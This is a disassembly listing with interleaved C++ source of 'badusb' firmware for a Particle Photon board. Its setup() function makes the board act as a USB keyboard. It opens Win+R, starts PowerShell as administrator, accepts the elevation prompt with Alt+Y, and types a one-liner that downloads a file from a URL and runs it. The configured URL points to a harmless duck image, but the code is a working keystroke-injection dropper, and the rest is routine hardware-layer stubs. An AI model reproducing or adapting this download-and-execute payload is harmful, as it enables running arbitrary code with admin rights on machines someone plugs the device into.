
c:/Users/jmand/Documents/particle-photon-badusb/target/3.3.0/photon/particle-photon-badusb.elf:     file format elf32-littlearm

Sections:
Idx Name          Size      VMA       LMA       File off  Algn
  0 .module_info  00000018  080a0000  080a0000  00010000  2**0
                  CONTENTS, ALLOC, LOAD, READONLY, DATA
  1 .dynalib      00000004  080a0018  080a0018  00010018  2**2
                  CONTENTS, ALLOC, LOAD, READONLY, DATA
  2 .text         00001534  080a001c  080a001c  0001001c  2**2
                  CONTENTS, ALLOC, LOAD, READONLY, CODE
  3 .backup       00000004  40024000  080a1550  00014000  2**2
                  CONTENTS, ALLOC, LOAD, DATA
  4 .data         0000006c  20000000  080a1554  00020000  2**2
                  CONTENTS, ALLOC, LOAD, DATA
  5 .bss          00000150  2000006c  2000006c  0003006c  2**2
                  ALLOC
  6 .module_info_suffix 00000028  080a15c0  080a15c0  000215c0  2**0
                  CONTENTS, ALLOC, LOAD, READONLY, DATA
  7 .module_info_crc 00000004  080a15e8  080a15e8  000215e8  2**0
                  CONTENTS, ALLOC, LOAD, READONLY, DATA
  8 .debug_info   000864ac  00000000  00000000  000215ec  2**0
                  CONTENTS, READONLY, DEBUGGING, OCTETS
  9 .debug_abbrev 0000c553  00000000  00000000  000a7a98  2**0
                  CONTENTS, READONLY, DEBUGGING, OCTETS
 10 .debug_loc    00012f51  00000000  00000000  000b3feb  2**0
                  CONTENTS, READONLY, DEBUGGING, OCTETS
 11 .debug_aranges 00001700  00000000  00000000  000c6f3c  2**0
                  CONTENTS, READONLY, DEBUGGING, OCTETS
 12 .debug_ranges 00003640  00000000  00000000  000c863c  2**0
                  CONTENTS, READONLY, DEBUGGING, OCTETS
 13 .debug_macro  000225e9  00000000  00000000  000cbc7c  2**0
                  CONTENTS, READONLY, DEBUGGING, OCTETS
 14 .debug_line   00020bee  00000000  00000000  000ee265  2**0
                  CONTENTS, READONLY, DEBUGGING, OCTETS
 15 .debug_str    000ae370  00000000  00000000  0010ee53  2**0
                  CONTENTS, READONLY, DEBUGGING, OCTETS
 16 .debug_frame  00003ba8  00000000  00000000  001bd1c4  2**2
                  CONTENTS, READONLY, DEBUGGING, OCTETS

Disassembly of section .text:

080a001c <module_user_pre_init>:
/**
 * Initializes this user module. Returns the start of the heap.
 */
void* module_user_pre_init() {

    if ( (&link_global_data_start!=&link_global_data_initial_values) && (link_global_data_size != 0))
 80a001c:	4809      	ldr	r0, [pc, #36]	; (80a0044 <module_user_pre_init+0x28>)
 80a001e:	490a      	ldr	r1, [pc, #40]	; (80a0048 <module_user_pre_init+0x2c>)
void* module_user_pre_init() {
 80a0020:	b508      	push	{r3, lr}
    if ( (&link_global_data_start!=&link_global_data_initial_values) && (link_global_data_size != 0))
 80a0022:	4288      	cmp	r0, r1
 80a0024:	d005      	beq.n	80a0032 <module_user_pre_init+0x16>
 80a0026:	4a09      	ldr	r2, [pc, #36]	; (80a004c <module_user_pre_init+0x30>)
 80a0028:	4282      	cmp	r2, r0
 80a002a:	d002      	beq.n	80a0032 <module_user_pre_init+0x16>
    {
        memcpy(&link_global_data_start, &link_global_data_initial_values, link_global_data_size);
 80a002c:	1a12      	subs	r2, r2, r0
 80a002e:	f000 ff8d 	bl	80a0f4c <memcpy>
    }

    memset(&link_bss_location, 0, link_bss_size );
 80a0032:	4807      	ldr	r0, [pc, #28]	; (80a0050 <module_user_pre_init+0x34>)
 80a0034:	4a07      	ldr	r2, [pc, #28]	; (80a0054 <module_user_pre_init+0x38>)
 80a0036:	2100      	movs	r1, #0
 80a0038:	1a12      	subs	r2, r2, r0
 80a003a:	f000 ff95 	bl	80a0f68 <memset>
    return &link_heap_start;
}
 80a003e:	4806      	ldr	r0, [pc, #24]	; (80a0058 <module_user_pre_init+0x3c>)
 80a0040:	bd08      	pop	{r3, pc}
 80a0042:	bf00      	nop
 80a0044:	20000000 	.word	0x20000000
 80a0048:	080a1554 	.word	0x080a1554
 80a004c:	2000006c 	.word	0x2000006c
 80a0050:	2000006c 	.word	0x2000006c
 80a0054:	200001b9 	.word	0x200001b9
 80a0058:	200001b9 	.word	0x200001b9

080a005c <module_user_init>:
extern constructor_ptr_t link_constructors_location[];
extern constructor_ptr_t link_constructors_end;
#define link_constructors_size   ((unsigned long)&link_constructors_end  -  (unsigned long)&link_constructors_location )

void module_user_init()
{
 80a005c:	b570      	push	{r4, r5, r6, lr}
    module_user_init_hook();
 80a005e:	f000 fcc1 	bl	80a09e4 <module_user_init_hook>

    // invoke constructors
    for (size_t ctor_num=0; ctor_num < link_constructors_size/sizeof(constructor_ptr_t); ctor_num++ )
 80a0062:	2500      	movs	r5, #0
 80a0064:	4e05      	ldr	r6, [pc, #20]	; (80a007c <module_user_init+0x20>)
 80a0066:	4c06      	ldr	r4, [pc, #24]	; (80a0080 <module_user_init+0x24>)
 80a0068:	1ba4      	subs	r4, r4, r6
 80a006a:	08a4      	lsrs	r4, r4, #2
 80a006c:	42ac      	cmp	r4, r5
 80a006e:	d100      	bne.n	80a0072 <module_user_init+0x16>
    {
        link_constructors_location[ctor_num]();
    }
}
 80a0070:	bd70      	pop	{r4, r5, r6, pc}
        link_constructors_location[ctor_num]();
 80a0072:	f856 3b04 	ldr.w	r3, [r6], #4
 80a0076:	4798      	blx	r3
    for (size_t ctor_num=0; ctor_num < link_constructors_size/sizeof(constructor_ptr_t); ctor_num++ )
 80a0078:	3501      	adds	r5, #1
 80a007a:	e7f7      	b.n	80a006c <module_user_init+0x10>
 80a007c:	080a1528 	.word	0x080a1528
 80a0080:	080a1548 	.word	0x080a1548

080a0084 <module_user_setup>:

/**
 * Export these functions with a fuller name so they don't clash with the setup/loop wrappers in the system module.
 */
void module_user_setup() {
    setup();
 80a0084:	f000 b814 	b.w	80a00b0 <setup>

080a0088 <module_user_loop>:
}

void module_user_loop() {
 80a0088:	b508      	push	{r3, lr}
    loop();
 80a008a:	f000 f89b 	bl	80a01c4 <loop>
    _post_loop();
}
 80a008e:	e8bd 4008 	ldmia.w	sp!, {r3, lr}
    _post_loop();
 80a0092:	f000 bc5f 	b.w	80a0954 <_post_loop>

080a0096 <_Znaj>:
 80a0096:	f000 b9c9 	b.w	80a042c <malloc>

080a009a <_ZdlPvj>:
	free(p);
}

void operator delete(void *p, size_t size)
{
	free(p);
 80a009a:	f000 b9cf 	b.w	80a043c <free>

080a009e <__cxa_guard_acquire>:

/* Provide default implemenation for __cxa_guard_acquire() and
 * __cxa_guard_release(). Note: these must be revisited if a multitasking
 * OS is ported to this platform. */
__extension__ typedef int __guard __attribute__((mode (__DI__)));
int __cxa_guard_acquire(__guard *g) {return !*(char *)(g);};
 80a009e:	7800      	ldrb	r0, [r0, #0]
 80a00a0:	fab0 f080 	clz	r0, r0
 80a00a4:	0940      	lsrs	r0, r0, #5
 80a00a6:	4770      	bx	lr

080a00a8 <__cxa_guard_release>:
void __cxa_guard_release (__guard *g) {*(char *)g = 1;};
 80a00a8:	2301      	movs	r3, #1
 80a00aa:	7003      	strb	r3, [r0, #0]
 80a00ac:	4770      	bx	lr
	...

080a00b0 <setup>:

// EXAMPLE USAGE
// Use STARTUP() macro to avoid USB disconnect/reconnect (see begin() documentation)
STARTUP(Keyboard.begin());

void setup() {
 80a00b0:	b510      	push	{r4, lr}
 80a00b2:	b090      	sub	sp, #64	; 0x40

  String url = "https://www.munchkin.com/media/catalog/product/3/1/31001_white_hot_safety_bath_ducky.jpg";
 80a00b4:	4668      	mov	r0, sp
 80a00b6:	493c      	ldr	r1, [pc, #240]	; (80a01a8 <setup+0xf8>)
 80a00b8:	f000 fa3c 	bl	80a0534 <_ZN6StringC1EPK19__FlashStringHelper>
  String file = "31001_white_hot_safety_bath_ducky.jpg";
 80a00bc:	493b      	ldr	r1, [pc, #236]	; (80a01ac <setup+0xfc>)
 80a00be:	a804      	add	r0, sp, #16
 80a00c0:	f000 fa38 	bl	80a0534 <_ZN6StringC1EPK19__FlashStringHelper>
  String ride = "https://ia600209.us.archive.org/32/items/WagnerTheRideOfTheValkyries/WagnerTheRideOfTheValkyrieswww.keepvid.com.mp3";
 80a00c4:	493a      	ldr	r1, [pc, #232]	; (80a01b0 <setup+0x100>)
 80a00c6:	a808      	add	r0, sp, #32
 80a00c8:	f000 fa34 	bl	80a0534 <_ZN6StringC1EPK19__FlashStringHelper>

  // WIN+R to open Run
  Keyboard.press(KEY_LEFT_WINDOWS);
 80a00cc:	f000 fbf0 	bl	80a08b0 <_Z18_fetch_usbkeyboardv>
 80a00d0:	6803      	ldr	r3, [r0, #0]
 80a00d2:	2200      	movs	r2, #0
 80a00d4:	21e3      	movs	r1, #227	; 0xe3
 80a00d6:	699b      	ldr	r3, [r3, #24]
 80a00d8:	4798      	blx	r3
  // Keyboard.press(114);
  Keyboard.press(KEY_R);
 80a00da:	f000 fbe9 	bl	80a08b0 <_Z18_fetch_usbkeyboardv>
 80a00de:	6803      	ldr	r3, [r0, #0]
 80a00e0:	2200      	movs	r2, #0
 80a00e2:	2115      	movs	r1, #21
 80a00e4:	699b      	ldr	r3, [r3, #24]
 80a00e6:	4798      	blx	r3
  Keyboard.releaseAll();
 80a00e8:	f000 fbe2 	bl	80a08b0 <_Z18_fetch_usbkeyboardv>
 80a00ec:	6803      	ldr	r3, [r0, #0]
 80a00ee:	6a1b      	ldr	r3, [r3, #32]
 80a00f0:	4798      	blx	r3
  delay(300);
 80a00f2:	f44f 7096 	mov.w	r0, #300	; 0x12c
 80a00f6:	f000 fac3 	bl	80a0680 <delay>

  // Start PowerShell as admin
  Keyboard.print("powershell Start-Process powershell -Verb runAs");
 80a00fa:	f000 fbd9 	bl	80a08b0 <_Z18_fetch_usbkeyboardv>
 80a00fe:	492d      	ldr	r1, [pc, #180]	; (80a01b4 <setup+0x104>)
 80a0100:	f000 fa88 	bl	80a0614 <_ZN5Print5printEPKc>
  Keyboard.click(KEY_RETURN);
 80a0104:	f000 fbd4 	bl	80a08b0 <_Z18_fetch_usbkeyboardv>
 80a0108:	6803      	ldr	r3, [r0, #0]
 80a010a:	2200      	movs	r2, #0
 80a010c:	2128      	movs	r1, #40	; 0x28
 80a010e:	695b      	ldr	r3, [r3, #20]
 80a0110:	4798      	blx	r3

  // wait for startup (kinda slow)
  delay(2500);
 80a0112:	f640 10c4 	movw	r0, #2500	; 0x9c4
 80a0116:	f000 fab3 	bl	80a0680 <delay>

  // confirm (2x TAB, RETURN) running PowerShell as admin
  // Keyboard.click(KEY_TAB);
  // Keyboard.click(KEY_TAB);
  // Keyboard.click(KEY_RETURN);
  Keyboard.press(KEY_LALT);
 80a011a:	f000 fbc9 	bl	80a08b0 <_Z18_fetch_usbkeyboardv>
 80a011e:	6803      	ldr	r3, [r0, #0]
 80a0120:	2200      	movs	r2, #0
 80a0122:	21e2      	movs	r1, #226	; 0xe2
 80a0124:	699b      	ldr	r3, [r3, #24]
 80a0126:	4798      	blx	r3
  // Keyboard.press(121);
  Keyboard.press(KEY_Y);
 80a0128:	f000 fbc2 	bl	80a08b0 <_Z18_fetch_usbkeyboardv>
 80a012c:	6803      	ldr	r3, [r0, #0]
 80a012e:	2200      	movs	r2, #0
 80a0130:	211c      	movs	r1, #28
 80a0132:	699b      	ldr	r3, [r3, #24]
 80a0134:	4798      	blx	r3
  Keyboard.releaseAll();
 80a0136:	f000 fbbb 	bl	80a08b0 <_Z18_fetch_usbkeyboardv>
 80a013a:	6803      	ldr	r3, [r0, #0]
 80a013c:	6a1b      	ldr	r3, [r3, #32]
 80a013e:	4798      	blx	r3
  delay(500);
 80a0140:	f44f 70fa 	mov.w	r0, #500	; 0x1f4
 80a0144:	f000 fa9c 	bl	80a0680 <delay>

  // Run PowerShell command: save file at $url as $file and execute it
  // DANGEROUS AS FUCK COMMAND OBVIOUSLY BE CAREFUL WITH $url CONTENTS
  // Saves file to Users\$user filesystem root
  Keyboard.print("[Net.ServicePointManager]::SecurityProtocol = 'tls12, tls11, tls'; $down = New-Object System.Net.WebClient; $url = '" + url +"'; $file = '" + file +"'; $down.DownloadFile($url,$file); $exec = New-Object -com shell.application; $exec.shellexecute($PSScriptRoot + $file); exit;");
 80a0148:	f000 fbb2 	bl	80a08b0 <_Z18_fetch_usbkeyboardv>

class StringSumHelper : public String
{
public:
	StringSumHelper(const String &s) : String(s) {}
	StringSumHelper(const char *p) : String(p) {}
 80a014c:	491a      	ldr	r1, [pc, #104]	; (80a01b8 <setup+0x108>)
 80a014e:	4604      	mov	r4, r0
 80a0150:	a80c      	add	r0, sp, #48	; 0x30
 80a0152:	f000 f9ef 	bl	80a0534 <_ZN6StringC1EPK19__FlashStringHelper>
 80a0156:	4669      	mov	r1, sp
 80a0158:	a80c      	add	r0, sp, #48	; 0x30
 80a015a:	f000 fa15 	bl	80a0588 <_ZplRK15StringSumHelperRK6String>
 80a015e:	4917      	ldr	r1, [pc, #92]	; (80a01bc <setup+0x10c>)
 80a0160:	f000 fa1e 	bl	80a05a0 <_ZplRK15StringSumHelperPKc>
 80a0164:	a904      	add	r1, sp, #16
 80a0166:	f000 fa0f 	bl	80a0588 <_ZplRK15StringSumHelperRK6String>
 80a016a:	4915      	ldr	r1, [pc, #84]	; (80a01c0 <setup+0x110>)
 80a016c:	f000 fa18 	bl	80a05a0 <_ZplRK15StringSumHelperPKc>
 80a0170:	6801      	ldr	r1, [r0, #0]
 80a0172:	4620      	mov	r0, r4
 80a0174:	f000 fa4e 	bl	80a0614 <_ZN5Print5printEPKc>
class StringSumHelper : public String
 80a0178:	a80c      	add	r0, sp, #48	; 0x30
 80a017a:	f000 f991 	bl	80a04a0 <_ZN6StringD1Ev>
  delay(200);
 80a017e:	20c8      	movs	r0, #200	; 0xc8
 80a0180:	f000 fa7e 	bl	80a0680 <delay>
  Keyboard.click(KEY_RETURN);
 80a0184:	f000 fb94 	bl	80a08b0 <_Z18_fetch_usbkeyboardv>
 80a0188:	6803      	ldr	r3, [r0, #0]
 80a018a:	2200      	movs	r2, #0
 80a018c:	2128      	movs	r1, #40	; 0x28
 80a018e:	695b      	ldr	r3, [r3, #20]
 80a0190:	4798      	blx	r3
  String ride = "https://ia600209.us.archive.org/32/items/WagnerTheRideOfTheValkyries/WagnerTheRideOfTheValkyrieswww.keepvid.com.mp3";
 80a0192:	a808      	add	r0, sp, #32
 80a0194:	f000 f984 	bl	80a04a0 <_ZN6StringD1Ev>
  String file = "31001_white_hot_safety_bath_ducky.jpg";
 80a0198:	a804      	add	r0, sp, #16
 80a019a:	f000 f981 	bl	80a04a0 <_ZN6StringD1Ev>
  String url = "https://www.munchkin.com/media/catalog/product/3/1/31001_white_hot_safety_bath_ducky.jpg";
 80a019e:	4668      	mov	r0, sp
 80a01a0:	f000 f97e 	bl	80a04a0 <_ZN6StringD1Ev>
  // Press Ctrl, then Alt, then Delete and release them all
  // Keyboard.press(KEY_LCTRL);
  // Keyboard.press(KEY_LALT);
  // Keyboard.press(KEY_DELETE);
  // Keyboard.releaseAll();
}
 80a01a4:	b010      	add	sp, #64	; 0x40
 80a01a6:	bd10      	pop	{r4, pc}
 80a01a8:	080a10d8 	.word	0x080a10d8
 80a01ac:	080a110b 	.word	0x080a110b
 80a01b0:	080a1131 	.word	0x080a1131
 80a01b4:	080a11a5 	.word	0x080a11a5
 80a01b8:	080a11d5 	.word	0x080a11d5
 80a01bc:	080a124a 	.word	0x080a124a
 80a01c0:	080a1257 	.word	0x080a1257

080a01c4 <loop>:

void loop() {

 80a01c4:	4770      	bx	lr

080a01c6 <_GLOBAL__sub_I_setup>:
 80a01c6:	b508      	push	{r3, lr}
STARTUP(Keyboard.begin());
 80a01c8:	f000 fb72 	bl	80a08b0 <_Z18_fetch_usbkeyboardv>
 80a01cc:	e8bd 4008 	ldmia.w	sp!, {r3, lr}
STARTUP(Keyboard.begin());
 80a01d0:	f000 baa8 	b.w	80a0724 <_ZN11USBKeyboard5beginEv>

080a01d4 <HAL_RNG_GetRandomNumber>:

DYNALIB_BEGIN(hal)

#if PLATFORM_ID > 3
DYNALIB_FN(0, hal, HAL_RNG_Configuration, void(void))
DYNALIB_FN(1, hal, HAL_RNG_GetRandomNumber, uint32_t(void))
 80a01d4:	b508      	push	{r3, lr}
 80a01d6:	4b02      	ldr	r3, [pc, #8]	; (80a01e0 <HAL_RNG_GetRandomNumber+0xc>)
 80a01d8:	681b      	ldr	r3, [r3, #0]
 80a01da:	685b      	ldr	r3, [r3, #4]
 80a01dc:	9301      	str	r3, [sp, #4]
 80a01de:	bd08      	pop	{r3, pc}
 80a01e0:	0806019c 	.word	0x0806019c

080a01e4 <HAL_Timer_Get_Milli_Seconds>:
#endif

DYNALIB_FN(BASE_IDX + 0, hal, HAL_Delay_Milliseconds, void(uint32_t))
DYNALIB_FN(BASE_IDX + 1, hal, HAL_Delay_Microseconds, void(uint32_t))
DYNALIB_FN(BASE_IDX + 2, hal, HAL_Timer_Get_Micro_Seconds, system_tick_t(void))
DYNALIB_FN(BASE_IDX + 3, hal, HAL_Timer_Get_Milli_Seconds, system_tick_t(void))
 80a01e4:	b508      	push	{r3, lr}
 80a01e6:	4b02      	ldr	r3, [pc, #8]	; (80a01f0 <HAL_Timer_Get_Milli_Seconds+0xc>)
 80a01e8:	681b      	ldr	r3, [r3, #0]
 80a01ea:	695b      	ldr	r3, [r3, #20]
 80a01ec:	9301      	str	r3, [sp, #4]
 80a01ee:	bd08      	pop	{r3, pc}
 80a01f0:	0806019c 	.word	0x0806019c

080a01f4 <hal_usart_write>:
#endif

DYNALIB_FN(BASE_IDX + 0, hal_usart, hal_usart_init, void(hal_usart_interface_t, hal_usart_ring_buffer_t*, hal_usart_ring_buffer_t*))
DYNALIB_FN(BASE_IDX + 1, hal_usart, hal_usart_begin, void(hal_usart_interface_t, uint32_t))
DYNALIB_FN(BASE_IDX + 2, hal_usart, hal_usart_end, void(hal_usart_interface_t))
DYNALIB_FN(BASE_IDX + 3, hal_usart, hal_usart_write, uint32_t(hal_usart_interface_t, uint8_t))
 80a01f4:	b508      	push	{r3, lr}
 80a01f6:	4b02      	ldr	r3, [pc, #8]	; (80a0200 <hal_usart_write+0xc>)
 80a01f8:	681b      	ldr	r3, [r3, #0]
 80a01fa:	6a5b      	ldr	r3, [r3, #36]	; 0x24
 80a01fc:	9301      	str	r3, [sp, #4]
 80a01fe:	bd08      	pop	{r3, pc}
 80a0200:	080601c4 	.word	0x080601c4

080a0204 <hal_usart_available>:
DYNALIB_FN(BASE_IDX + 4, hal_usart, hal_usart_available, int32_t(hal_usart_interface_t))
 80a0204:	b508      	push	{r3, lr}
 80a0206:	4b02      	ldr	r3, [pc, #8]	; (80a0210 <hal_usart_available+0xc>)
 80a0208:	681b      	ldr	r3, [r3, #0]
 80a020a:	6a9b      	ldr	r3, [r3, #40]	; 0x28
 80a020c:	9301      	str	r3, [sp, #4]
 80a020e:	bd08      	pop	{r3, pc}
 80a0210:	080601c4 	.word	0x080601c4

080a0214 <hal_usart_read>:
DYNALIB_FN(BASE_IDX + 5, hal_usart, hal_usart_read, int32_t(hal_usart_interface_t))
 80a0214:	b508      	push	{r3, lr}
 80a0216:	4b02      	ldr	r3, [pc, #8]	; (80a0220 <hal_usart_read+0xc>)
 80a0218:	681b      	ldr	r3, [r3, #0]
 80a021a:	6adb      	ldr	r3, [r3, #44]	; 0x2c
 80a021c:	9301      	str	r3, [sp, #4]
 80a021e:	bd08      	pop	{r3, pc}
 80a0220:	080601c4 	.word	0x080601c4

080a0224 <hal_usart_peek>:
DYNALIB_FN(BASE_IDX + 6, hal_usart, hal_usart_peek, int32_t(hal_usart_interface_t))
 80a0224:	b508      	push	{r3, lr}
 80a0226:	4b02      	ldr	r3, [pc, #8]	; (80a0230 <hal_usart_peek+0xc>)
 80a0228:	681b      	ldr	r3, [r3, #0]
 80a022a:	6b1b      	ldr	r3, [r3, #48]	; 0x30
 80a022c:	9301      	str	r3, [sp, #4]
 80a022e:	bd08      	pop	{r3, pc}
 80a0230:	080601c4 	.word	0x080601c4

080a0234 <hal_usart_flush>:
DYNALIB_FN(BASE_IDX + 7, hal_usart, hal_usart_flush, void(hal_usart_interface_t))
 80a0234:	b508      	push	{r3, lr}
 80a0236:	4b02      	ldr	r3, [pc, #8]	; (80a0240 <hal_usart_flush+0xc>)
 80a0238:	681b      	ldr	r3, [r3, #0]
 80a023a:	6b5b      	ldr	r3, [r3, #52]	; 0x34
 80a023c:	9301      	str	r3, [sp, #4]
 80a023e:	bd08      	pop	{r3, pc}
 80a0240:	080601c4 	.word	0x080601c4

080a0244 <hal_usart_available_data_for_write>:
DYNALIB_FN(BASE_IDX + 8, hal_usart, hal_usart_is_enabled, bool(hal_usart_interface_t))
DYNALIB_FN(BASE_IDX + 9, hal_usart, hal_usart_half_duplex, void(hal_usart_interface_t, bool))
DYNALIB_FN(BASE_IDX + 10, hal_usart, hal_usart_available_data_for_write, int32_t(hal_usart_interface_t))
 80a0244:	b508      	push	{r3, lr}
 80a0246:	4b02      	ldr	r3, [pc, #8]	; (80a0250 <hal_usart_available_data_for_write+0xc>)
 80a0248:	681b      	ldr	r3, [r3, #0]
 80a024a:	6c1b      	ldr	r3, [r3, #64]	; 0x40
 80a024c:	9301      	str	r3, [sp, #4]
 80a024e:	bd08      	pop	{r3, pc}
 80a0250:	080601c4 	.word	0x080601c4

080a0254 <hal_usart_init_ex>:
DYNALIB_FN(BASE_IDX2 + 0, hal_usart, hal_usart_begin_config, void(hal_usart_interface_t serial, uint32_t baud, uint32_t config, void *ptr))
DYNALIB_FN(BASE_IDX2 + 1, hal_usart, hal_usart_write_nine_bits, uint32_t(hal_usart_interface_t serial, uint16_t data))
DYNALIB_FN(BASE_IDX2 + 2, hal_usart, hal_usart_send_break, void(hal_usart_interface_t, void*))
DYNALIB_FN(BASE_IDX2 + 3, hal_usart, hal_usart_break_detected, uint8_t(hal_usart_interface_t))
DYNALIB_FN(BASE_IDX2 + 4, hal_usart, hal_usart_sleep, int(hal_usart_interface_t serial, bool, void*))
DYNALIB_FN(BASE_IDX2 + 5, hal_usart, hal_usart_init_ex, int(hal_usart_interface_t, const hal_usart_buffer_config_t*, void*))
 80a0254:	b508      	push	{r3, lr}
 80a0256:	4b02      	ldr	r3, [pc, #8]	; (80a0260 <hal_usart_init_ex+0xc>)
 80a0258:	681b      	ldr	r3, [r3, #0]
 80a025a:	6e1b      	ldr	r3, [r3, #96]	; 0x60
 80a025c:	9301      	str	r3, [sp, #4]
 80a025e:	bd08      	pop	{r3, pc}
 80a0260:	080601c4 	.word	0x080601c4

080a0264 <HAL_USB_USART_Init>:
#endif

DYNALIB_BEGIN(hal_usb)

#ifdef USB_CDC_ENABLE
DYNALIB_FN(0, hal_usb, HAL_USB_USART_Init, void(HAL_USB_USART_Serial, const HAL_USB_USART_Config*))
 80a0264:	b508      	push	{r3, lr}
 80a0266:	4b02      	ldr	r3, [pc, #8]	; (80a0270 <HAL_USB_USART_Init+0xc>)
 80a0268:	681b      	ldr	r3, [r3, #0]
 80a026a:	681b      	ldr	r3, [r3, #0]
 80a026c:	9301      	str	r3, [sp, #4]
 80a026e:	bd08      	pop	{r3, pc}
 80a0270:	080601d8 	.word	0x080601d8

080a0274 <HAL_USB_USART_Available_Data>:
DYNALIB_FN(1, hal_usb, HAL_USB_USART_Begin, void(HAL_USB_USART_Serial, uint32_t, void *))
DYNALIB_FN(2, hal_usb, HAL_USB_USART_End, void(HAL_USB_USART_Serial))
DYNALIB_FN(3, hal_usb, HAL_USB_USART_Baud_Rate, unsigned int(HAL_USB_USART_Serial))
DYNALIB_FN(4, hal_usb, HAL_USB_USART_Available_Data, int32_t(HAL_USB_USART_Serial))
 80a0274:	b508      	push	{r3, lr}
 80a0276:	4b02      	ldr	r3, [pc, #8]	; (80a0280 <HAL_USB_USART_Available_Data+0xc>)
 80a0278:	681b      	ldr	r3, [r3, #0]
 80a027a:	691b      	ldr	r3, [r3, #16]
 80a027c:	9301      	str	r3, [sp, #4]
 80a027e:	bd08      	pop	{r3, pc}
 80a0280:	080601d8 	.word	0x080601d8

080a0284 <HAL_USB_USART_Available_Data_For_Write>:
DYNALIB_FN(5, hal_usb, HAL_USB_USART_Available_Data_For_Write, int32_t(HAL_USB_USART_Serial))
 80a0284:	b508      	push	{r3, lr}
 80a0286:	4b02      	ldr	r3, [pc, #8]	; (80a0290 <HAL_USB_USART_Available_Data_For_Write+0xc>)
 80a0288:	681b      	ldr	r3, [r3, #0]
 80a028a:	695b      	ldr	r3, [r3, #20]
 80a028c:	9301      	str	r3, [sp, #4]
 80a028e:	bd08      	pop	{r3, pc}
 80a0290:	080601d8 	.word	0x080601d8

080a0294 <HAL_USB_USART_Receive_Data>:
DYNALIB_FN(6, hal_usb, HAL_USB_USART_Receive_Data, int32_t(HAL_USB_USART_Serial, uint8_t))
 80a0294:	b508      	push	{r3, lr}
 80a0296:	4b02      	ldr	r3, [pc, #8]	; (80a02a0 <HAL_USB_USART_Receive_Data+0xc>)
 80a0298:	681b      	ldr	r3, [r3, #0]
 80a029a:	699b      	ldr	r3, [r3, #24]
 80a029c:	9301      	str	r3, [sp, #4]
 80a029e:	bd08      	pop	{r3, pc}
 80a02a0:	080601d8 	.word	0x080601d8

080a02a4 <HAL_USB_USART_Send_Data>:
DYNALIB_FN(7, hal_usb, HAL_USB_USART_Send_Data, int32_t(HAL_USB_USART_Serial, uint8_t))
 80a02a4:	b508      	push	{r3, lr}
 80a02a6:	4b02      	ldr	r3, [pc, #8]	; (80a02b0 <HAL_USB_USART_Send_Data+0xc>)
 80a02a8:	681b      	ldr	r3, [r3, #0]
 80a02aa:	69db      	ldr	r3, [r3, #28]
 80a02ac:	9301      	str	r3, [sp, #4]
 80a02ae:	bd08      	pop	{r3, pc}
 80a02b0:	080601d8 	.word	0x080601d8

080a02b4 <HAL_USB_USART_Flush_Data>:
DYNALIB_FN(8, hal_usb, HAL_USB_USART_Flush_Data, void(HAL_USB_USART_Serial))
 80a02b4:	b508      	push	{r3, lr}
 80a02b6:	4b02      	ldr	r3, [pc, #8]	; (80a02c0 <HAL_USB_USART_Flush_Data+0xc>)
 80a02b8:	681b      	ldr	r3, [r3, #0]
 80a02ba:	6a1b      	ldr	r3, [r3, #32]
 80a02bc:	9301      	str	r3, [sp, #4]
 80a02be:	bd08      	pop	{r3, pc}
 80a02c0:	080601d8 	.word	0x080601d8

080a02c4 <HAL_USB_HID_Init>:
#else
#define BASE_IDX 0
#endif

#ifdef USB_HID_ENABLE
DYNALIB_FN(BASE_IDX + 0, hal_usb, HAL_USB_HID_Init, void(uint8_t, void*))
 80a02c4:	b508      	push	{r3, lr}
 80a02c6:	4b02      	ldr	r3, [pc, #8]	; (80a02d0 <HAL_USB_HID_Init+0xc>)
 80a02c8:	681b      	ldr	r3, [r3, #0]
 80a02ca:	6b1b      	ldr	r3, [r3, #48]	; 0x30
 80a02cc:	9301      	str	r3, [sp, #4]
 80a02ce:	bd08      	pop	{r3, pc}
 80a02d0:	080601d8 	.word	0x080601d8

080a02d4 <HAL_USB_HID_Begin>:
DYNALIB_FN(BASE_IDX + 1, hal_usb, HAL_USB_HID_Begin, void(uint8_t, void*))
 80a02d4:	b508      	push	{r3, lr}
 80a02d6:	4b02      	ldr	r3, [pc, #8]	; (80a02e0 <HAL_USB_HID_Begin+0xc>)
 80a02d8:	681b      	ldr	r3, [r3, #0]
 80a02da:	6b5b      	ldr	r3, [r3, #52]	; 0x34
 80a02dc:	9301      	str	r3, [sp, #4]
 80a02de:	bd08      	pop	{r3, pc}
 80a02e0:	080601d8 	.word	0x080601d8

080a02e4 <HAL_USB_HID_Send_Report>:
DYNALIB_FN(BASE_IDX + 2, hal_usb, HAL_USB_HID_Send_Report, void(uint8_t, void*, uint16_t, void*))
 80a02e4:	b508      	push	{r3, lr}
 80a02e6:	4b02      	ldr	r3, [pc, #8]	; (80a02f0 <HAL_USB_HID_Send_Report+0xc>)
 80a02e8:	681b      	ldr	r3, [r3, #0]
 80a02ea:	6b9b      	ldr	r3, [r3, #56]	; 0x38
 80a02ec:	9301      	str	r3, [sp, #4]
 80a02ee:	bd08      	pop	{r3, pc}
 80a02f0:	080601d8 	.word	0x080601d8

080a02f4 <HAL_USB_HID_Status>:
#else
# define BASE_IDX4 BASE_IDX3
#endif

#ifdef USB_HID_ENABLE
DYNALIB_FN(BASE_IDX4 + 0, hal_usb, HAL_USB_HID_Status, int32_t(uint8_t, void*))
 80a02f4:	b508      	push	{r3, lr}
 80a02f6:	4b02      	ldr	r3, [pc, #8]	; (80a0300 <HAL_USB_HID_Status+0xc>)
 80a02f8:	681b      	ldr	r3, [r3, #0]
 80a02fa:	6e1b      	ldr	r3, [r3, #96]	; 0x60
 80a02fc:	9301      	str	r3, [sp, #4]
 80a02fe:	bd08      	pop	{r3, pc}
 80a0300:	080601d8 	.word	0x080601d8

080a0304 <inet_gethostbyname>:
DYNALIB_FN(14, hal_wlan, wlan_set_error_count, void(uint32_t))
DYNALIB_FN(15, hal_wlan, wlan_fetch_ipconfig, int(WLanConfig*))
DYNALIB_FN(16, hal_wlan, wlan_setup, void(void))

DYNALIB_FN(17, hal_wlan, HAL_NET_SetNetWatchDog, uint32_t(uint32_t))
DYNALIB_FN(18, hal_wlan, inet_gethostbyname, int(const char*, uint16_t, HAL_IPAddress*, network_interface_t, void*))
 80a0304:	b508      	push	{r3, lr}
 80a0306:	4b02      	ldr	r3, [pc, #8]	; (80a0310 <inet_gethostbyname+0xc>)
 80a0308:	681b      	ldr	r3, [r3, #0]
 80a030a:	6c9b      	ldr	r3, [r3, #72]	; 0x48
 80a030c:	9301      	str	r3, [sp, #4]
 80a030e:	bd08      	pop	{r3, pc}
 80a0310:	080601c0 	.word	0x080601c0

080a0314 <set_system_mode>:
#endif

DYNALIB_BEGIN(system)

